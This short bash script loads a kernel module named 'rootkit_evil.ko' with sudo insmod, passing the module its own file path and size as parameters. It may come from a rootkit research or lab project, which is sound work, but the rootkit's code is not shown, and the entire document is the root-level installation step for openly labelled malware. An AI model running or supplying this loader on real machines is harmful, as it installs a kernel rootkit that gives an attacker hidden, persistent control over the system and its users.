#!/bin/bash

sudo insmod {,mod_elf_path=$(pwd)/}rootkit_evil.ko mod_elf_size=$(wc -c < rootkit_evil.ko)
